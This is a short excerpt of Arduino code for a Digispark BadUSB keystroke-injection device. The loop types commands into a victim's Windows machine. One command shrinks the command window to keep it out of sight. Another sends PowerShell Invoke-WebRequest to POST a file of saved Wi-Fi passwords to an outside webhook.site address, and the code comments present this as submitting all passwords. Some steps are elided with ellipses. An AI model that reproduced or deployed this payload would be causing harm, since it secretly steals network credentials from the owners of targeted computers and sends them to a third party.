...
void loop() {
  ...
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=5"); //smallest cmd window possible
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/ca5f7a57-c06a-42e0-a9ad-b88efa9b069c -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboard.delay(1000);
